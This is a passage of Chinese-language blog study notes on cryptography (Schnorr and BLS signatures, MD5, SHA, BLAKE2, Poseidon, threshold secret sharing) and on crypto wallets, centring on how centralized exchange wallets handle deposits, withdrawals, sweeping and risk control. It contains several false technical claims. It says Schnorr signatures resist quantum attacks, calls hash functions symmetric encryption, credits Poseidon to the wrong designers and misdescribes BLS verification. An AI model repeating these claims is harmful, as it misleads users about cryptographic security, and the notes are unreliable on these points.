Schnorr基本步骤</h3><p>下面是Schnorr算法的基本步骤：</p><ol><li>密钥生成：<ul><li>随机选择一个私钥（私钥是一个随机数）。</li><li>使用椭圆曲线上的点乘法运算生成对应的公钥（不懂没关系）。</li></ul></li><li>签名生成：<ul><li>选择一个随机数作为临时私钥。</li><li>使用临时私钥和消息的哈希值计算出一个临时公钥。（只需要一次哈希）</li><li>使用临时私钥、消息和临时公钥等参数计算出签名的值。</li></ul></li><li>验证签名：<ul><li>使用公钥和消息的哈希值重复计算出签名的值。</li><li>将计算得到的签名值与原始的签名值进行比较，如果相等，则验证通过。</li></ul></li></ol><h3 id="3-5-1-Schnorr优点"><a href="#3-5-1-Schnorr优点" class="headerlink" title="3.5.1 Schnorr优点"></a><strong>3.5.1 Schnorr优点</strong></h3><ul><li><strong>高效性</strong>：相比于其它签名算法，Schnorr签名在计算上更加高效，特别是在签名生成和验证过程中，计算量较小，签名和验证的速度快</li><li><strong>短签名</strong>：Schnorr签名长度较短，有助于节省带宽和存储空间。</li><li><strong>线性性质</strong>：Schnorr签名具有线性性质，这意味着可以对多个签名进行聚合，从而减少交易的大小和验证的成本。</li><li><strong>安全性</strong>：基于离散对数问题的安全性，难以被破解。</li><li><strong>抗量子计算攻击</strong>：Schnorr签名方案被认为对量子计算攻击有较好的抵抗性，因此在未来量子计算成为现实时，Schnorr签名可能会成为主流选择。</li></ul><h3 id="3-5-2-Schnorr应用"><a href="#3-5-2-Schnorr应用" class="headerlink" title="3.5.2. Schnorr应用"></a><strong>3.5.2. Schnorr应用</strong></h3><p>比特币的Taproot升级中使用了基于Schnorr签名的聚合签名技术。此外，许多密码协议和标准也采用了Schnorr签名算法。紧凑型和灵活性都很高</p><p>总之，Schnorr签名算法以其高效和安全的特点，成为了现代密码学中的一个重要工具，尤其在对资源要求较高的应用场景中具有显著优势</p><h2 id="3-6-BLS算法"><a href="#3-6-BLS算法" class="headerlink" title="3.6 BLS算法"></a>3.6 BLS算法</h2><p>Schnorr验证的有点BLS都具备，</p><p>支持批量验证的特点，对多重签名的场景支持度相当高</p><p>以太坊升级后用的多</p><p>BLS（Boneh-Lynn-Shacham）签名算法是一种基于双线性对（bilinear pairing）的数字签名方案</p><h3 id="3-6-1基本步骤"><a href="#3-6-1基本步骤" class="headerlink" title="3.6.1基本步骤"></a>3.6.1基本步骤</h3><p>以下是BLS签名算法的基本步骤：</p><ol><li>密钥生成：<ul><li>随机选择一个私钥（私钥是一个随机数）。</li><li>使用椭圆曲线上的点乘法运算生成对应的公钥。</li></ul></li><li>签名生成：<ul><li>将消息的哈希值作为输入。</li><li>使用私钥对哈希值进行签名，生成一个签名值。</li></ul></li><li>验证签名：<ul><li>使用公钥和消息的哈希值重复计算出签名的值。</li><li>将计算得到的签名值与原始的签名值进行比较，如果相等，则验证通过。</li></ul></li></ol><h3 id="3-6-2-特点和应用"><a href="#3-6-2-特点和应用" class="headerlink" title="3.6.2 特点和应用"></a>3.6.2 特点和应用</h3><ul><li><strong>简洁性</strong>：BLS签名非常简洁，签名的大小固定且较小，只有一个群元素。</li><li><strong>效率</strong>：签名生成和验证的计算量相对较小，尤其是在签名长度较短的情况下。</li><li><strong>聚合签名</strong>：BLS签名具有天然的签名聚合（aggregate signature）特性，多个签名可以被聚合成一个签名，从而减少存储和传输的开销。这在区块链和分布式系统中尤为有用。</li><li><strong>多重签名</strong>：BLS也支持<strong>多重签名</strong>（multi-signature），多个用户可以共同签署同一消息，生成一个联合签名。</li></ul><p>不同点：</p><p><strong>签名聚合</strong>：</p><ul><li>BLS签名算法：BLS签名算法天然支持签名的聚合。多个BLS签名可以通过简单的数学运算合并为单个签名，从而减少传输和验证的开销。</li><li>Schnorr签名算法：Schnorr签名算法不直接支持签名的聚合。要实现签名聚合，需要额外的协议或方案。</li></ul><h1 id="4-单向散列函数算法介绍（属于对称加密）"><a href="#4-单向散列函数算法介绍（属于对称加密）" class="headerlink" title="4 单向散列函数算法介绍（属于对称加密）"></a>4 单向散列函数算法介绍（属于对称加密）</h1><p>MD5、SHA-1、SHA-2、SHA-3（以太坊）、blake、blake2（用的多）、波赛登（用的多）</p><p>单向散列函数（One-way hash function）是一种重要的密码学工具，它将<strong>输入数据</strong>转换为<strong>固定长度</strong>的输出值，称为<strong>哈希值</strong>，同时具备以下特性：</p><ol><li><strong>单向性</strong>（One-way property）：计算从哈希值到原始输入的逆过程是困难的。即给定哈希值，计算出原始输入是困难的。</li><li><strong>固定输出长度</strong>：单向散列函数生成的哈希值具有<strong>固定</strong>的长度，无论输入的长度如何。</li><li><strong>抗碰撞性</strong>（Collision resistance）：很难找到两个不同的输入，它们生成相同的哈希值</li></ol><h2 id="4-1-MD5"><a href="#4-1-MD5" class="headerlink" title="4.1 MD5"></a>4.1 MD5</h2><h3 id="4-1-1-MD5特点"><a href="#4-1-1-MD5特点" class="headerlink" title="4.1.1 MD5特点"></a>4.1.1 MD5特点</h3><p>以下是MD5的基本特点和特性：</p><ol><li><strong>单向性</strong>：MD5是一种单向散列函数，根据给定输入计算出固定长度的哈希值，但从哈希值<strong>推导</strong>出原始输入是非常困难的，这是其单向性的关键特性。</li><li><strong>固定输出长度</strong>：无论输入的长度如何，MD5生成的哈希值始终为128位，长度固定。它将输入数据转换为一个128位（16字节）的哈希值，通常表示为32个十六进制数字。</li><li><strong>快速计算</strong>：相对于较新的哈希函数，如SHA-256，MD5计算速度较快，适用于一些对性能要求较高的场景。</li></ol><h3 id="4-1-2-MD5步骤"><a href="#4-1-2-MD5步骤" class="headerlink" title="4.1.2 MD5步骤"></a>4.1.2 MD5步骤</h3><ol><li><strong>填充数据</strong>：将输入数据进行填充，使其长度满足对512位（64字节）块的整数倍。填充方式是在数据末尾添加一个”1”比特，然后填充若干”0”比特，直到满足长度要求。</li><li><strong>初始化状态</strong>：定义四个32位的寄存器（A、B、C、D）作为MD5的内部状态。初始时，这些寄存器包含预定义的固定值。</li><li><strong>处理块数据</strong>：将填充后的数据划分为512位（64字节）的块，并对每个块进行处理。</li><li><strong>划分为子块</strong>：将每个512位块划分为16个32位的子块，每个子块占据4个字节。</li><li><strong>初始化变量</strong>：定义四个32位变量（A、B、C、D），并将其初始化为初始状态的寄存器值。</li><li><strong>循环运算</strong>：通过四轮循环，对子块进行一系列的位运算和非线性函数操作，更新变量的值。</li><li><strong>输出结果</strong>：经过循环运算后，得到最终的MD5哈希值。将四个32位变量按照小端字节序连接起来，形成128位（16字节）的哈希值。</li></ol><h3 id="4-1-3-MD5-用途"><a href="#4-1-3-MD5-用途" class="headerlink" title="4.1.3 MD5 用途"></a>4.1.3 MD5 用途</h3><ol><li><strong>一致性验证</strong>：网上下载被人的文件，可以看到这个文件的MD5值，然后你用工具验证你下载的文件的MD5值和别人给出的这个MD5值是否一致？一致就说明数据在传输过程中没有问题。</li><li><strong>数字证书</strong> ：如果有一个第三方的认证机构，用MD5还可以防止文件作者的“抵赖”，这就是所谓的数字签名应用。</li><li><strong>安全访问认证</strong>：在Unix系统中用户的密码是以MD5（或其它类似的算法）经Hash运算后存储在文件系统中。当用户登录的时候，系统把用户输入的密码进行MD5 Hash运算，然后再去和保存在文件系统中的MD5值进行比较，进而确定输入的密码是否正确。通过这样的步骤，系统在并不知道用户密码的明码的情况下就可以确定用户登录系统的合法性。</li></ol><p>然而，需要注意的是，MD5存在以下主要安全性问题：</p><ol><li><strong>碰撞攻击</strong>：MD5已经被证明对碰撞攻击不安全。碰撞指的是找到两个不同的输入，它们生成相同的MD5哈希值。这意味着攻击者可以通过构造特定的输入来伪造数据或篡改数据，从而破坏完整性。</li><li><strong>预映射攻击</strong>：通过选择特定的输入，可以在计算MD5哈希值之前进行预计算，从而加速碰撞攻击的实施。</li></ol><p>安全性：已被破解–&gt;中国王小云</p><h2 id="4-2-SHA-系列算法"><a href="#4-2-SHA-系列算法" class="headerlink" title="4.2 SHA 系列算法"></a>4.2 SHA 系列算法</h2><p>安全散列算法（英语：Secure Hash Algorithm，缩写为SHA）是一个密码散列函数家族，能计算出一个数字消息所对应到的，长度固定的字符串（又称消息摘要）的算法。</p><p>且若输入的消息不同，它们对应到不同字符串的机率很高。SHA家族算法分别是SHA-0；SHA-1；SHA-224、SHA-256、SHA-384，SHA-512和SHA3。SHA-224、SHA-256、SHA-384，SHA-512 有时并称为 SHA-2， SHA3 是第三代安全散列算法(Secure Hash Algorithm 3)，之前名为 Keccak 算法，在硬件实做上面，这个算法比起其他算法明显的快上很多，目前 SHA-0，SHA-1 已被破解。</p><p>sha-256属于sha-2家族</p><h2 id="4-3-Blake-和-Blake2系列算法"><a href="#4-3-Blake-和-Blake2系列算法" class="headerlink" title="4.3 Blake 和 Blake2系列算法"></a>4.3 Blake 和 Blake2系列算法</h2><p>BLAKE（及其后续版本 BLAKE2）是一种快速且安全的哈希算法，参与了SHA-3竞赛并成为了SHA-3的五个决赛选手之一。</p><p>BLAKE2 是一种快速、安全的哈希函数，是对 BLAKE 算法的改进。BLAKE2 于 2012 年发布，其设计目标是提供比 MD5、SHA-1 和 SHA-2 更高的安全性和更快的速度，同时保持高度的灵活性和简便性。</p><h3 id="4-3-1-Blake-系列算法特点"><a href="#4-3-1-Blake-系列算法特点" class="headerlink" title="4.3.1 Blake 系列算法特点"></a>4.3.1 Blake 系列算法特点</h3><ul><li><strong>高效性能</strong>：BLAKE2 比 SHA-2（如 SHA-256 和 SHA-512）更快，同时在现代 CPU 上的性能通常优于 MD5 和 SHA-1。BLAKE2 的设计充分利用了现代处理器的特性，使其在软件实现中非常高效。</li><li><strong>高安全性</strong>：BLAKE2 提供了与 SHA-3 相媲美的安全性。它具有以下特性：<ul><li><strong>抗碰撞攻击</strong>：很难找到两个不同的输入使得它们的哈希值相同。</li><li><strong>抗预映射攻击</strong>：很难找到一个给定哈希值对应的原始输入。</li><li><strong>抗第二预映射攻击</strong>：很难找到与给定输入具有相同哈希值的另一个输</li></ul></li><li>可变长度输出：BLAKE2 可以生成任意长度的哈希值，从 1 比特到 512 比特。这使得它在许多应用中非常灵活。（MD6固定128位）</li><li><strong>简单易用</strong>：BLAKE2 的设计和实现都相对简单，这有助于降低实现中的错误风险。它还提供了多种变种，以满足不同需求：<ul><li><strong>BLAKE2b</strong>：适用于 64 位平台，输出长度可达 512 比特。</li><li><strong>BLAKE2s</strong>：适用于 32 位平台，输出长度可达 256 比特。</li></ul></li><li><strong>内置特性</strong>：BLAKE2 集成了多种常用功能，这使得它在许多应用中更加便捷：<ul><li><strong>密钥哈希（Keyed Hashing）</strong>：可以使用密钥生成消息认证码（MAC）。</li><li><strong>盐值（Salted Hashing）</strong>：允许使用盐值增强哈希的安全性。</li><li><strong>个性化（Personalized Hashing）</strong>：可以根据应用需求定制哈希值。</li></ul></li></ul><h3 id="4-3-2-blake2-应用场景"><a href="#4-3-2-blake2-应用场景" class="headerlink" title="4.3.2 blake2 应用场景"></a>4.3.2 blake2 应用场景</h3><p>由于其高效性和安全性，BLAKE2 被广泛应用于各种领域，包括但不限于：</p><ul><li><strong>密码学应用</strong>：如数字签名、消息认证码、随机数生成等。</li><li><strong>数据完整性验证</strong>：如文件校验、数据备份验证等。</li><li><strong>区块链和加密货币</strong>：BLAKE2 被许多区块链项目用作哈希函数。以太坊</li></ul><h2 id="4-4-Poseidon-（波赛登）算法"><a href="#4-4-Poseidon-（波赛登）算法" class="headerlink" title="4.4 Poseidon （波赛登）算法"></a>4.4 Poseidon （波赛登）算法</h2><p>Poseidon 是一种现代加密哈希函数，设计用于零知识证明（Zero-Knowledge Proofs, ZKPs）等高级密码学应用。它由研究人员 Benedikt Bunz, Dario Fiore, Iddo Bentov, and Pavel Vasin 等人设计。Poseidon 的设计目标是提供一种高效且安全的哈希算法，特别适合用于 zk-SNARKs 和 zk-STARKs 等 ZKP 系统中。</p><h3 id="4-4-1-Poseidon-算法的特点"><a href="#4-4-1-Poseidon-算法的特点" class="headerlink" title="4.4.1 Poseidon 算法的特点"></a>4.4.1 Poseidon 算法的特点</h3><ul><li><strong>针对零知识证明优化</strong>： Poseidon 设计时考虑了在零知识证明系统中的应用，优化了哈希计算的效率，特别是减少了算术电路中的门数量（gate count）。Zero—Knowledge </li><li><strong>基于加密结构</strong>： Poseidon 采用 Sponge 结构，这种结构在密码学中广泛应用于构建哈希函数和伪随机数生成器。Sponge 结构由两个主要阶段组成：吸收（absorb）和挤出（squeeze）。</li><li><strong>高效性</strong>： Poseidon 的设计特别注重计算效率，适合在资源受限的环境中运行，比如区块链中的智能合约或零知识证明的证明生成过程。</li><li><strong>灵活性</strong>： Poseidon 可以根据不同的应用需求进行配置，支持不同的安全参数和性能优化。</li><li><strong>安全性</strong>： Poseidon 提供了较高的安全性，抗碰撞攻击、预映射攻击和第二预映射攻击，满足现代密码学的安全需求。</li></ul><h3 id="4-4-2-Poseidon-的构造"><a href="#4-4-2-Poseidon-的构造" class="headerlink" title="4.4.2 Poseidon 的构造"></a>4.4.2 Poseidon 的构造</h3><p>Poseidon 的具体实现涉及复杂的数学构造，包括有限域上的非线性变换和线性层的组合。以下是 Poseidon 的基本构造概述：</p><ul><li><strong>状态初始化</strong>： Poseidon 初始化一个状态向量，状态的大小通常取决于安全参数和哈希输出的长度。</li><li><strong>非线性层（S-Box）</strong>： Poseidon 在状态向量的每个元素上应用一个非线性变换（通常是有限域上的幂操作），这种变换称为 S-Box。</li><li><strong>线性层</strong>： Poseidon 应用一个线性变换，将状态向量的元素混合。通常，这个线性变换是通过一个矩阵乘法实现的。</li><li><strong>轮函数（Round Function）</strong>： 非线性层和线性层组合成一个轮函数。Poseidon 多次应用轮函数，将输入数据充分混合，确保输出哈希值的安全性。</li><li><strong>Sponge 结构</strong>： Poseidon 使用 Sponge 结构处理输入数据。首先在吸收阶段将输入数据分块处理并更新状态向量，然后在挤出阶段从状态向量中提取哈希值。</li></ul><h3 id="4-4-3-Poseidon-的应用"><a href="#4-4-3-Poseidon-的应用" class="headerlink" title="4.4.3 Poseidon 的应用"></a>4.4.3 Poseidon 的应用</h3><ul><li><strong>区块链</strong>： Poseidon 因其高效性和安全性，被认为是区块链系统中实现零知识证明的理想哈希函数。例如，Poseidon 可以用于生成 zk-SNARKs 和 zk-STARKs 中的证明和验证过程。</li><li><strong>隐私保护</strong>： Poseidon 可以用于保护数据隐私，通过零知识证明确保数据的完整性和保密性而无需透露实际数据内容。</li><li><strong>智能合约</strong>： Poseidon 可以集成到区块链智能合约中，提供高效的哈希计算和验证功能，增强智能合约的安全性和性能。</li></ul><h1 id="5-总结【重要】"><a href="#5-总结【重要】" class="headerlink" title="5 总结【重要】"></a>5 总结【重要】</h1><p>我们都知道，哈希算法 (Hash Algorithm) 是将任意长度的数据映射为固定长度数据的算法，也称为消息摘要。</p><p>一般情况下，哈希算法有两个特点, </p><ul><li><p>一是原始数据的细微变化（比如一个位翻转）会导致结果产生巨大差距；入变出变</p></li><li><p>二是运算过程不可逆，理论上无法从结果还原输入数据。不可逆向</p></li></ul><p>因此，哈希算法主要用于数据完整性校验和加密&#x2F;签名。</p><p>哈希算法的安全性就在于碰撞难易度，即已知结果，构建出具有相同结果的输入数据的难易度。</p><p>常见的哈希算法有 MD5, SHA-1, SHA-2, SHA-3。</p><p>其中 MD5 已经可以在 2^21 复杂度（在主流智能手机上只需30秒）内完成碰撞，</p><p>谷歌也于17年早些时候在 2^64 复杂度（约 110 GPU年的计算量）内完成了第一次 SHA-1 碰撞。</p><p>至此，MD5 和 SHA-1 已经在安全领域被废弃。</p><p>当前除了 SHA-2，SHA-3 之外，还有另外一个哈希算法系列可供选择，那就是 <strong>BLAKE，BLAKE2</strong> 系列</p><p>比常见的 MD5，SHA-1，SHA-2，SHA-3 <strong>更快</strong>，同时提供不低于 SHA-3 的<strong>安全性</strong>。</p><p>对于区块链中的零知识证明系统，<strong>Poseidon</strong> 是目前应用的最广泛的算法。</p><h1 id="6-门限共享秘密【其他】"><a href="#6-门限共享秘密【其他】" class="headerlink" title="6 门限共享秘密【其他】"></a>6 门限共享秘密【其他】</h1><p>门限秘密共享（Threshold Secret Sharing）是一种密码学技术，</p><p>用于将一个秘密信息分割成多个部分，分发给多个参与者，在满足一定门限条件时才能恢复出原始秘密。</p><p>这种方案提供了分散化的安全性，即不依赖于任何单个参与者的信任，只有在多个参与者合作的情况下才能获取秘密。</p><p>以下是门限秘密共享方案的基本原理：</p><ol><li><strong>秘密分割</strong>：将原始秘密信息分割成多个部分，每个部分称为共享（Share）。通常使用Shamir’s Secret Sharing算法或其他类似的方法进行分割。这些共享被分发给不同的参与者，每个参与者持有一个或多个共享。</li><li><strong>门限条件</strong>：指定一个门限值（Threshold），需要达到该门限值才能重构秘密。例如，将门限值设置为3，意味着至少需要3个或更多的参与者合作才能恢复秘密。</li><li><strong>秘密恢复</strong>：当参与者合作时，他们可以将各自的共享合并，通过一定的计算方法恢复出原始秘密。恢复秘密的计算通常使用插值算法或其他恢复算法，根据收集到的共享进行计算。</li></ol><p>门限秘密共享方案的优势在于分散化的安全性，即没有单点故障或单个参与者能够获取完整的秘密。即使部分参与者受到攻击或泄露，只要门限条件得到满足，秘密仍然是安全的。这种方案在许多领域中有广泛应用，如多方身份验证、安全多方计算、密码学等。</p><h2 id="6-1-云端可干扰抗秘钥丢失的方案（Seek做的）"><a href="#6-1-云端可干扰抗秘钥丢失的方案（Seek做的）" class="headerlink" title="6.1 云端可干扰抗秘钥丢失的方案（Seek做的）"></a>6.1 云端可干扰抗秘钥丢失的方案（Seek做的）</h2><p><img src="/img/web3/%E4%BA%91%E7%AB%AF%E5%8F%AF%E5%B9%B2%E6%89%B0%E6%8A%97%E7%A7%98%E9%92%A5%E4%B8%A2%E5%A4%B1%E7%9A%84%E6%96%B9%E6%A1%88.jpg" alt="云端可干扰抗秘钥丢失的方案"></p><p>实现逻辑</p><p>用到了门限共享秘密、异或算法</p><p>现在有一个云端服务cloud-server</p><p>本地钱包里面的SDK里面有一个秘密（或者私钥），我现在目的是我丢了这个秘钥我能找回来，但我又怕你们作恶，我就设计了一个这个方案。</p><p>首先我本地生成一个大随机数random number，</p><p>我现在拿我的这个秘密+random number做一次异或算法得到一个value </p><p>然后把这个random number通过API上传到云端去（加密后上传的，加密方式暂不管）</p><p>然后将这个value 去进行门限共享秘密拆分成n个sharnds ,假设n&#x3D;6,k&#x3D;3</p><p>假设其他丢失了，只得到3个，把这3个进行逆门限解密，可以得到这个value，</p><p>拿到value之后，再去请求云端，把这个random number拿下来，</p><p>这个时候手上就有value + random number 进行一次逆异或运算得到你的秘钥</p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02 钱包</title>
    <link href="/2024/05/19/02%E9%92%B1%E5%8C%85/"/>
    <url>/2024/05/19/02%E9%92%B1%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h1><h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h1><p>钱包怎么分类？本质是私钥的管理方式的不同来区分的</p><h1 id="2-钱包分类"><a href="#2-钱包分类" class="headerlink" title="2. 钱包分类"></a>2. 钱包分类</h1><ul><li><strong>中心化钱包</strong>：钱包私钥一般管理在<strong>中心化服务器</strong>上，代表项目为交易所钱包；例如 Binance 交易所钱包，okx 交易所钱包和 bybit 交易所钱包等1。</li><li><strong>去中心化钱包</strong>(确定性分层钱包)：钱包私钥一般管理在<strong>用户</strong>的设备上，代表项目为 TP, ImToken, MetaMask 等；</li><li><strong>硬件钱包</strong>：钱包私钥管理在离线的<strong>硬件</strong>设备上，代表项目 ledger, onekey 等。</li><li><strong>交易所 Web3 钱包</strong>：一般的交易所 Web3 钱包集成了，<strong>中心化钱包</strong>，<strong>去中心化钱包</strong>(确定性分层钱包)和<strong>硬件钱包</strong>的功能。</li><li><strong>托管钱包</strong>：托管在第三方服务的钱包，一般为 MPC 算法，每个节点有一个密钥片，网络中没有完整的私钥出现过, N-M 的签名方式，总节点为 N 个，M 个节点签名交易即有效。隐私保护、分布式计算、安全性2</li></ul><blockquote><p>MPC（Secure Multiparty Computation）算法是一种加密和隐私保护技术，用于在多个参与方之间进行计算，同时保持各方输入的隐私性。MPC 允许多个参与方在不公开彼此输入信息的情况下执行计算，并获得计算结果。</p></blockquote><ul><li><strong>多签钱包</strong>：EVM 链一般使用 gnosis safe 多签，其他使用传统密码学方式多签</li></ul><blockquote><p>多签钱包（Multisignature Wallet），也被称为多重签名钱包，是一种加强安全性的加密货币钱包。与传统的单签名钱包不同，多签钱包要求多个密钥持有人共同参与批准交易，以便进行资金的转移或操作。</p><p>多个密钥持有人：多签钱包涉及多个密钥，通常是由不同的个体、组织或设备控制。这些密钥持有人被称为共同签名者（cosigners），并且需要达成共识才能执行交易.</p><p>签名阈值：多签钱包通过设置签名阈值（Signature Threshold）来确定需要多少个共同签名者批准交易。例如，一个2-of-3的多签钱包需要至少两个共同签名者的批准才能执行交易。</p></blockquote><ul><li><strong>MPC钱包</strong>：采用秘密共享技术来管理和生成加密货币私钥的钱包。</li><li><strong>社交恢复钱包</strong>: 密钥分片备份恢复，守护者恢复，</li><li>EVM 链 AA 钱包：ERC4337 协议独有特性，提供账户抽象功能，实现智能合约级别的钱包服务。</li></ul><blockquote><p>区别在于私钥放在哪里？</p></blockquote><blockquote><p>交易所钱包私钥是在交易所手上，去中心化钱包私钥是在自己的手上</p></blockquote><blockquote><p>助记词：对应一个rootkey，一个rootkey可以导出一个一个的childkey，childkey就会对应一个pubkey，pubkey会对应生成一个地址BTP44协议</p></blockquote><h1 id="3-中心化钱包"><a href="#3-中心化钱包" class="headerlink" title="3.中心化钱包"></a>3.中心化钱包</h1><p>主要功能是批量地址生成、充值、提现、归集、转冷、冷转热、回滚、钱包风控、钱包对账器</p><h2 id="3-1-中心化钱包架构图"><a href="#3-1-中心化钱包架构图" class="headerlink" title="3.1. 中心化钱包架构图"></a>3.1. 中心化钱包架构图</h2><p><img src="/img/web3/wallet1.png" alt="wallte1"></p><p>交易所私钥管理方式：一般管理在一下4种方式</p><p>Tee 环境，Tee是一个安全可执行环境，Tee 环境虽然是一个安全的执行环境，但是私钥也是加密之后存储在这个环境的数据库或者文件里面，每次签名也要在这个环境中解密私钥进行签名，私钥暴露的风险也很大，团队成员想拿到私钥也很容易，只需要签名前传人私钥是打一个日志就行。</p><p>cloud HSM：一种云端管理方式,最安全和最专业的做法是使用 cloadHSM 或者多节点备份的小型签名机，私钥不会离开设备，需要签名的时候，传入待签名的报文，cloadHSM 或者小型签名机签名结束之后返回签名报文，然后整理签名交易报文发送到区块链网络。</p><p>KMS：很少用了</p><p>小型机:</p><p>不管是使用数据库、数据文件、 KMS、TEE，还是 CloadHSM，安全级别也是相对的，有一句话说得好: “<strong>外贼易挡，家贼难防</strong>“，这句话用在钱包管理上真的是太正确了。不管用什么方案，即使是 CloadHSM 或者小型机方案，”家贼也是很难防”，家贼完全可以模拟一笔合法的交易让 CloadHSM 或小型机方案签名，然后把钱盗走。为了防止家贼，正常的交易所钱包都要做链路风控体系。</p><p>从上面的架构图中，我们可以看到，对于交易所钱包来说，通常有这些业务流程</p><ul><li>批量地址生成</li><li>充值</li><li>提现</li><li>归集</li><li>热转冷</li><li>冷转热</li><li>链路风控</li></ul><p>很多公司钱包开发，一般就是一个人负责整条链钱包的调研(离线地址生成，离线交易签名和扫块出入金)，开发（含充值，提现，归集，热转冷等功能开发，甚至含链路风控的一部分代码）和测试。当然，也有的公司分为三到四团队，调研和离线签是一个团队，扫链出入金，归集和转冷等功能是一个团队，链路风控是一个团队，测试是一个团队。不管怎么分，运维和开发是隔离的，这样做才能做大限度做到人为风控。</p><p>总结一下：</p><ol><li><strong>私钥存储</strong>：中心化钱包的私钥通常存储在中心服务器上，由服务提供者管理。用户不直接控制私钥，而是通过账户和密码来访问自己的资产。</li><li><strong>加密技术</strong>：为了保护私钥，中心化钱包服务提供者会采用各种加密技术，如DES加密、AES加密等，将私钥加密后存储。</li><li><strong>签名机制</strong>：当用户发起交易时，钱包服务会解密私钥，使用私钥对交易进行签名，然后将签名后的交易发送到区块链网络。</li></ol><h2 id="3-2-中心化钱包业务细节流程"><a href="#3-2-中心化钱包业务细节流程" class="headerlink" title="3.2. 中心化钱包业务细节流程"></a>3.2. 中心化钱包业务细节流程</h2><ul><li>批量地址生成：交易所钱包为了性能和快速响应用户，所有交易所钱包都会有一个地址池，地址池里面每次生成成千上万的地址，当用户注册到交易所的时直接给用户<strong>分配</strong>地址，而不是去<strong>生成</strong>；当地址池里面的地址少于一定数量时就会去新生成一批。批量地址生成：交易所一次会生成10W个地址，地址对应的私钥会存到交易所的中心化的数据库里面去，当有用户在交易所注册时，会去给用户分配一个地址。地址生成：生成privkey—-pubkey—address，</li></ul><p><img src="/img/web3/batch.png" alt="batch"></p><ul><li>充值：钱包有个程序，一直在扫链(scan block ),parse to(解析交易)，然后发现to地址如果是交易所系统中地址（交易所地址分用户地址和系统地址）如果发现是用户地址，就认定这是一笔充值，那交易所就会给用户上账（入金），上账之后把通知给到交易所对端（交易所业务层），充值：扫链服务扫区块链，解析区块里面的交易数据，当交易数据里面的 to 地址是系统里的用户地址时，就说明有用户充值；充值这个过程除了钱包充值扫块之外，还会和风控一起联合，只有风控系统和钱包都认可这笔交易，才会通知业务层；解析的时候需要注意有人构造恶意交易，有的链是可以构造交易攻击的。</li></ul><p><img src="/img/web3/top-up.png" alt="top-up"></p><ul><li>提现:  当业务层发起一笔提交交易，业务层的交易会进入到业务层数据库，业务层扫库之后提一笔交易到钱包–&gt;钱包对这个交易进行签名，去请求对应的Cloud HSM或者TEE环境的私钥或者小型机里面的私钥进行签名-&gt;签名回来了之后再组织了之后把交易发送到区块链网络上。这笔交易的from地址出来的地址不一定是你的地址，而是交易所的归集地址，这个时候你的syne block扫块的机制还会不停地扫块，扫块解析Tx，解析Tx出来之后发现我们的from地址和我们的系统地址是一样的，我们就认定为这笔交易是一笔提现交易，然后提现成功，再通知交易层成功了，然后告诉用户你提现成功了。<ul><li>客户端用户输入要提现的地址，金额，链；这些数据将进入交易所业务层，业务层提交数据给钱包，并建立签名参数风控；钱包拿到交易数据之后先验证是否能过风控，没有问题的去链上获取签名参数，组织交易之后生成待签名的交易报文，将交易报文递给签名机，签名机签名之后返回签名的交易报文，钱包服务组织交易之后发送到区块链网络。交易发送完成之后，扫链服务扫到这笔交易之后，验证风控，通过之后通知业务层提现成功，上报交易 Hash 等信息。</li></ul></li></ul><p><img src="/img/web3/withdraw.png" alt="withdraw"></p><ul><li><p>归集：归集功能是把用户地址里面的资金全部归集到一个规整地址里面去，归集是一个批量转账的过程，和提现的逻辑比较类似，就是业务类别不一样，这里就不再画流程图了，归集的是在热钱包地址（联网地址），</p></li><li><p>热转冷：将归集地址里面的资金转到一个冷钱包，归集是一个单笔转账的过程，和提现的逻辑比较类似，就是业务类别不一样，这里就不再画流程图了。</p></li><li><p>冷转热：从冷钱包将资金转到热钱包，手动操作的过程</p></li><li><p>钱包风控：</p><ul><li>业务层，不管用户充值还是提现，都是业务层，业务层作恶怎么办？<ul><li>业务在扫链，不是说自己扫链成功了之后就充值成功了，风控层也在扫链，风控扫到钱包没钱也不行，只有这两个层的数据对到了才会充值成功。</li></ul></li><li>钱包层：钱包层作恶：比如你的私钥在公司高管里面，他乱转钱，业务层认不认？ 也不认的，也要风控层扫链+业务层扫链，双重认证之后，才能重置，和业务层同样的道理。</li><li>钱包层一般掌握在钱包核心Leder手上，这个角色一般都是老板核心人员担任，因为风控可能出问题停了一会儿，或者手动停掉这个风控，在这个一瞬间，钱包层作恶，Leder把钱转出去了。</li></ul></li><li><p>交易回滚：交易回滚是指区块链网络的区块回滚或者重组，需要将钱包系统中的交易处理掉的过程，比方说：现在有一条链区块一下从 1000 个块回滚到 500 个块，那么钱包系统里面存储的 500-1000 个块的交易就是无效交易了，需要处理在这个块范围的所用用户的交易。</p></li></ul><p><img src="/img/web3/rollback.png" alt="rollback"></p><ul><li>对账系统: 钱包系统与业务层对账，钱包系统实时资产负债表等。原则上每半天或一天都要对一次账、</li></ul><p>概括<strong>总结</strong>：</p><ol><li><strong>批量地址生成</strong>：为了提高性能和响应速度，中心化钱包会预先生成大量的地址，存放在地址池中，用户注册时直接分配地址。</li><li><strong>充值</strong>：用户向钱包地址发送加密货币，钱包服务通过扫描区块链来确认交易，并更新用户的账户余额。</li><li><strong>提现</strong>：用户提交提现请求，钱包服务验证请求后，使用私钥签名交易，并将加密货币发送到用户指定的地址。</li><li><strong>归集</strong>：将分散在多个地址中的资金归集到一个或几个地址中，以便于管理和使用。</li><li><strong>热转冷</strong>：将热钱包中的资金转移到冷钱包中，以提高安全性。</li><li><strong>冷转热</strong>：从冷钱包中转移资金到热钱包，以便用户进行交易。</li><li><strong>链路风控</strong>：实施风险控制措施，确保交易的安全性，防止欺诈和非法活动。</li></ol><h2 id="3-3-安全性"><a href="#3-3-安全性" class="headerlink" title="3.3 安全性"></a>3.3 安全性</h2><ul><li><strong>内部风险</strong>：由于私钥由中心化服务管理，存在内部人员滥用权限的风险。</li><li><strong>外部攻击</strong>：中心化钱包可能成为黑客攻击的目标，一旦被攻破，用户资产将面临巨大风险。</li><li><strong>合规性</strong>：中心化钱包通常需要遵守严格的监管要求，包括KYC（了解你的客户）和AML（反洗钱）政策。</li></ul><h2 id="3-4-用户体验"><a href="#3-4-用户体验" class="headerlink" title="3.4 用户体验"></a>3.4 